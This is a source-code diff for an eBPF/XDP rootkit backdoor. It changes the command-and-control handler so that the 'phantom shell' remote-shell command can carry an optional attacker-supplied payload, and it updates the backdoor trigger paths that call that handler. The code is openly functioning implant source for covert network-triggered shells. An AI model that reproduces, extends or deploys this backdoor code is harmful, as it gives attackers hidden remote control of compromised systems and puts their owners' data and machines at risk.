@@ -10,7 +10,7 @@
 #include "../../../common/c&c.h"
 #include "../bpf/defs.h"
 
-static __always_inline int execute_key_command(int command_received, __u32 ip, __u16 port){
+static __always_inline int execute_key_command(int command_received, __u32 ip, __u16 port, char* optional_payload, int optional_payload_size){
     int pid = -1; //Received by network stack, just ignore
     switch(command_received){
         case CC_PROT_COMMAND_ENCRYPTED_SHELL:
@@ -36,8 +36,14 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
             struct backdoor_phantom_shell_data ps_new_data = {0};
             ps_new_data.active = 1;
             ps_new_data.d_ip  = ip;
-            ps_new_data.d_port = port;    
-            __builtin_memcpy(ps_new_data.payload, CC_PROT_PHANTOM_SHELL_INIT, 16);
+            ps_new_data.d_port = port;  
+            if(optional_payload_size == 0){
+                //First phantom init msg
+                __builtin_memcpy(ps_new_data.payload, CC_PROT_PHANTOM_SHELL_INIT, 16);
+            }else{
+                __builtin_memcpy(ps_new_data.payload, optional_payload, optional_payload_size);
+            }
+            
             ring_buffer_send_request_update_phantom_shell(&rb_comm, pid, command_received, ps_new_data);
             break;
             
@@ -169,7 +175,7 @@ backdoor_finish:
     __u32 ip = s_ip;
     __u16 port = s_port;
 
-    execute_key_command(command_received, ip, port);
+    execute_key_command(command_received, ip, port, NULL, 0);
 
     //return XDP_PASS;
     return XDP_DROP; 
@@ -296,7 +302,7 @@ backdoor_finish_v3_32:
         return 0;
     }
     bpf_printk("Completed backdoor trigger v3 (32bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received, 0, 0);
+    execute_key_command(command_received, 0, 0, NULL, 0);
 
     return 1;
 }
@@ -441,7 +447,7 @@ backdoor_finish_v3_16:
         return 0;
     }
     bpf_printk("Completed backdoor trigger v3 (16bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received, 0, 0);
+    execute_key_command(command_received, 0, 0, NULL, 0);
 
     return 1;
 }
